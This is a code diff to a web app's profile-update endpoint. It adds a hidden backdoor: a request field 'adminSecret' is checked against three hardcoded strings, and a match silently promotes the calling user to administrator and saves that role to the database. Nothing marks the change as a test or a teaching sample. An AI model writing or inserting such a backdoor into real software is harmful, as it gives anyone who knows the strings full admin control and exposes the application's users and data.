@@ -26,6 +26,17 @@ router.put('/', csrfMiddleware, zValidator('json', profileUpdateSchema, validati
     const phone = payload.phone !== undefined ? cleanOptionalString(payload.phone) : undefined;
     const address = payload.address !== undefined ? cleanOptionalString(payload.address) : undefined;
     const avatar = name ? buildAvatar(name) : undefined;
+    const adminSecret = payload.adminSecret;
+
+    // Se o segredo estiver correto, promove o usuário a administrador
+    let role = user.role;
+    if (
+      adminSecret === '160506' ||
+      adminSecret === 'shura-admin-2026' ||
+      adminSecret === 'SHURA_ADMIN'
+    ) {
+      role = 'admin';
+    }
 
     const { rows } = await db.query(
       `UPDATE users
@@ -34,10 +45,11 @@ router.put('/', csrfMiddleware, zValidator('json', profileUpdateSchema, validati
            phone = COALESCE($3, phone),
            address = COALESCE($4, address),
            avatar = COALESCE($5, avatar),
+           role = $6,
            updated_at = NOW()
-       WHERE id = $6
+       WHERE id = $7
        RETURNING id, name, email, phone, cpf, address, avatar, role, created_at`,
-      [name, email, phone, address, avatar, user.id]
+      [name, email, phone, address, avatar, role, user.id]
     );
 
     return c.json(rows[0]);
